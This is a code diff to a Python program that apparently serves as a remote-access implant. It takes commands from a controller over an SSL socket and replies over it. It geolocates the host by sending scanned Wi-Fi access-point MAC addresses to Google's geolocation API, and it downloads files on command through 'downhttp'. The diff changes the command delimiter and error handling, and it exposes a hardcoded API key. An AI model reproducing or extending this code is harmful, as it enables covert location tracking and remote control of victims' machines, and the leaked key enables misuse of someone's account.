@@ -125,21 +125,22 @@ else:
 def MapsWIFI(card):
     req = urllib2.Request("https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyAYNpMfeibwnaa1vUlMLHF4qTxJ8NVjTmI")# YOUR GOOGLE API KEY HERE
     wifiCell = Cell.all(card)
-    jWifi = "{\n \"wifiAccessPoints\": [\n"
-    for i in range(0,len(wifiCell)):
-        jWifi+="  {\n   \"macAddress\": "+'\"'+str(wifiCell[i].address)+'\",\n'
-        jWifi+='   \"'+"channel\": "+str(wifiCell[i].channel)+'\n  },\n'
-    jWifi = jWifi[:-2]
-    jWifi+="\n ]\n}"
-    print jWifi
-    req.add_header("Content-Type", "application/json")
-    jWifiReport = urllib2.urlopen(req, jWifi).read()
-    print jWifiReport
-    APdetected = str(len(wifiCell))
-    mapsDict = simplejson.loads(jWifiReport)
-    location = str(mapsDict.get("location",{}))[1:-1]
-    accuracy = "Accuracy: "+str(mapsDict.get("accuracy",{}))[1:-1]
-    mapMe = "|---"+location.split(",")[0]+"\n|---"+location.split(",")[1][1:]+"\n|---" + accuracy+"\n|---AP detected: " + APdetected
+    if len(wifiCell) < 2:
+        mapMe = "Error: not enought AP detected!"
+    else:
+        jWifi = "{\n \"wifiAccessPoints\": [\n"
+        for i in range(0,len(wifiCell)):
+            jWifi+="  {\n   \"macAddress\": "+'\"'+str(wifiCell[i].address)+'\",\n'
+            jWifi+='   \"'+"channel\": "+str(wifiCell[i].channel)+'\n  },\n'
+        jWifi = jWifi[:-2]
+        jWifi+="\n ]\n}"
+        req.add_header("Content-Type", "application/json")
+        jWifiReport = urllib2.urlopen(req, jWifi).read()
+        APdetected = str(len(wifiCell))
+        mapsDict = simplejson.loads(jWifiReport)
+        location = str(mapsDict.get("location",{}))[1:-1]
+        accuracy = "Accuracy: "+str(mapsDict.get("accuracy",{}))[:-1]
+        mapMe = "|---"+location.split(",")[0]+"\n|---"+location.split(",")[1][1:]+"\n|---" + accuracy+"\n|---AP detected: " + APdetected
     return mapMe
 
 
@@ -419,16 +420,16 @@ while 1:
         SendData(mapped)
     elif inText.startswith("downhttp"):
         try:
-            if len(inText.split(":")) == 3:
-                DownHTTP(inText.split(":")[1],inText.split(":")[2])
+            if len(inText.split("|")) == 3:
+                DownHTTP(inText.split("|")[1],inText.split("|")[2])
                 SendData("Download complete!")
-            elif len(inText.split(":")) == 2:
-                DownHTTP(inText.split(":")[1],"")
+            elif len(inText.split("|")) == 2:
+                DownHTTP(inText.split("|")[1],"")
                 SendData("Download complete!")
             else:
-                SendData("Error! \n usage: downhttp:url:save.type")
+                SendData("Error! \n usage: downhttp|url|save.type")
         except IOError as err:
-            SendData("Error "+err)
+            SendData("Error "+str(err))
     else:
         print '[inText] ' + inText
         ssl_sock.write(inText)
